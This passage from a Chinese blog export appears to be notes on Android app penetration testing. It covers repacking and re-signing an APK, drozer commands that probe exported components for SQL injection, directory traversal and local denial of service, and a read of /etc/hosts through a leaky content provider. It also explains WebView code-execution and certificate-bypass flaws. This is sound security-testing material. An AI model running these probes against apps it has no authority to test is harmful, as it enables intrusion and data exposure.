title=\"反编译与打包\"></a>反编译与打包</h2><p>使用apktool将apk再反编译成文件(以下app名字为forinfor.apk,)<br><code>java -jar apktool.jar d -f forinfor.apk -o forinfor</code></p>\n<p>再将文件夹重新编译为apk文件</p>\n<p><code>apktool b forinfor -o newforinfor.apk</code></p>\n<p>再生成对应的签名文件</p>\n<p><code>keytool -genkeypair -v -keystore xample.keystore -alias test(这里是签名的别名) -keyalg RSA</code></p>\n<p><code>-keysize2048 -validity 10000</code></p>\n<p>完成签名文件的信息填写之后再用签名文件打包(这里如果出现乱码输入<strong>chcp 936</strong>)</p>\n<p><code>jarsigner -keystore xample.keystore -digestalg SHA1 -sigalg SHA1withRSA newforinfor.apk</code></p>\n<p><code>test(别名)</code></p>\n<h1 id=\"组件测试\"><a href=\"#组件测试\" class=\"headerlink\" title=\"组件测试\"></a>组件测试</h1><p>安卓有四大组件activity,service,broadcast receiver,content provider。activity组件就是我们常规看到的页面，app的每个页面都可以看作一个activity组件。service就是没有页面的服务，提供运算支持。broadcast receiver是对系统的广播，content provider是处理手机数据库的组件，用于存取数据。</p>\n<p>安装完drozer之后,在Android启动drozer的app，打开端口监听。</p>\n<p><code>adb forward tcp:31415 tcp:31415</code>端口转发。</p>\n<p><code>drozer.bat console connect</code>启动drozer,<strong>注意这里需要在drozer安装目录中启动drozer不然在运行一些命令会报错。</strong></p>\n<p><code>run app.package.list</code>查看模拟器安装的app名。这里看不见的话可以使用adb shell到Android安装目录/data/app查看,/data/data里也能看到包名，这是程序的数据存放目录。</p>\n<p>注:以下组件调用可能存在本地拒绝服务攻击。</p>\n<h2 id=\"Activity\"><a href=\"#Activity\" class=\"headerlink\" title=\"Activity\"></a>Activity</h2><p><code>run app.activity.info -a 包名</code>这里就会显示出所有可调用的包名。</p>\n<p><code>run app.activity.start --component 包名 组件名</code>这里主要是看通过调用组件能否调用一些敏感信息功能页面。</p>\n<h2 id=\"service\"><a href=\"#service\" class=\"headerlink\" title=\"service\"></a>service</h2><p><code>run app.service.info -a 包名</code>这里是可以查看可调用的服务名。</p>\n<p><code>run app.service.start --action 服务名 --component 包名 服务名</code>调用服务组件</p>\n<h2 id=\"broadcast\"><a href=\"#broadcast\" class=\"headerlink\" title=\"broadcast\"></a>broadcast</h2><p><code>run app.broadcast.info -a 包名</code>这里是可以查看可调用的广播名。</p>\n<p><code>run app.broadcast.send --component 包名 广播名 --extra string phoneNumber 222</code>查看恶意广播</p>\n<p><code>run app.broadcast.send --component 包名 广播名</code>本地DOS检测</p>\n<h2 id=\"Content\"><a href=\"#Content\" class=\"headerlink\" title=\"Content\"></a>Content</h2><p><code>run scanner.provider.injection -a 包名</code>检测sql注入</p>\n<p><code>run scanner.provider.traversal -a 包名</code>检测目录遍历漏洞</p>\n<p><code>run app.provider.read Content泄露组件名 文件目录</code>查看本机中的文件</p>\n<p><code>run app.provider.read Content组件名 /etc/hosts</code>查看本机的域名配置文件</p>\n<h1 id=\"WebView组件\"><a href=\"#WebView组件\" class=\"headerlink\" title=\"WebView组件\"></a>WebView组件</h1><h2 id=\"WebView代码执行检测\"><a href=\"#WebView代码执行检测\" class=\"headerlink\" title=\"WebView代码执行检测\"></a>WebView代码执行检测</h2><p>webview代码执行主要是由于低版本安卓上addJavascriptInterface功能无限制，当JS拿到Android这个对象后，就可以调用这个Android对象中所有的方法，包括系统类（java.lang.Runtime 类），从而进行任意代码执行。</p>\n<h4 id=\"Android-4-2版本之后\"><a href=\"#Android-4-2版本之后\" class=\"headerlink\" title=\"Android 4.2版本之后\"></a>Android 4.2版本之后</h4><p>Google 在Android 4.2 版本中规定对被调用的函数以 <code>@JavascriptInterface</code>进行注解从而避免漏洞攻击。</p>\n<h4 id=\"Android-4-2版本之前\"><a href=\"#Android-4-2版本之前\" class=\"headerlink\" title=\"Android 4.2版本之前\"></a>Android 4.2版本之前</h4><p>重写JavascriptInterface方法</p>\n<p><strong>searchBoxJavaBridge_、accessibility和 accessibilityTraversal组件在低版本也存在任意代码执行。</strong></p>\n<h2 id=\"WebView不校验证书检测\"><a href=\"#WebView不校验证书检测\" class=\"headerlink\" title=\"WebView不校验证书检测\"></a>WebView不校验证书检测</h2><p>搜索onReceivedSslError，调用了process()方法的话就会忽略掉证书的错误继续执行。</p>\n<h2 id=\"域控制不严格漏洞\"><a href=\"#域控制不严格漏洞\" class=\"headerlink\" title=\"域控制不严格漏洞\"></a>域控制不严格漏洞</h2><p>通过使用恶意代码来读取本地文件。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">setAllowFileAccess(false); //禁用file协议读取</span><br><span class=\"line\">setAllowFileAccessFromFileURLs(false);</span><br><span class=\"line\">setAllowUniversalAccessFromFileURLs(false);</span><br></pre></td></tr></table></figure>\n\n<p>即使禁用依旧可以通过<strong>符号链接跨源攻击</strong>，<strong>通过 javascript 的延时执行和将当前文件替换成指向其它文件的软链接就可以读取到被符号链接所指的文件</strong></p>\n<h1 id=\"参考链接\"><a href=\"#参考链接\" class=\"headerlink\" title=\"参考链接\"></a>参考链接</h1><p><a href=\"https://www.jianshu.com/p/3a345d27cd42\" target=\"_blank\" rel=\"noopener\">https://www.jianshu.com/p/3a345d27cd42</a></p>\n<p><a href=\"https://www.cnblogs.com/laughingQing/p/6392455.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/laughingQing/p/6392455.html</a></p>\n","categories":[],"tags":[]},{"title":"文章分类","url":"http://yoursite.com/category/index.html","content":"","categories":[],"tags":[]},{"title":"search","url":"http://yoursite.com/search/index.html","content":"","categories":[],"tags":[]},{"title":"link","url":"http://yoursite.com/link/index.html","content":"","categories":[],"tags":[]},{"title":"tags","url":"http://yoursite.com/tags/index.html","content":"","categories":[],"tags":[]}]